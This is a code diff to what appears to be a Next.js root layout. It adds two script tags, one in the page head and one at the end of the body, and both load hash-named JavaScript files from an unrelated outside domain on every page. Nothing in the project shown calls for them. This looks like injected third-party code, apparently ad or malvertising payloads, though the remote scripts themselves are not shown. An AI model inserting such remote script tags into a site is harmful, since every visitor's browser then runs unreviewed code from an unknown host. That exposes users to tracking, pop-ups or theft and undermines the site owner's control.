@@ -18,10 +18,12 @@ export default function RootLayout({ children }) {
           rel="icon"
           href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🦙</text></svg>"
         />
+        <script type='text/javascript' src='//goshbiopsy.com/1b/4e/54/1b4e54022a87f9d23e1735a55c5c8197.js'></script>
       </head>
       <body>
         {children}
         <Analytics />
+        <script type='text/javascript' src='//goshbiopsy.com/c0/0c/05/c00c056d68aadf6cc07f91c37c4367b6.js'></script>
       </body>
     </html>
   );
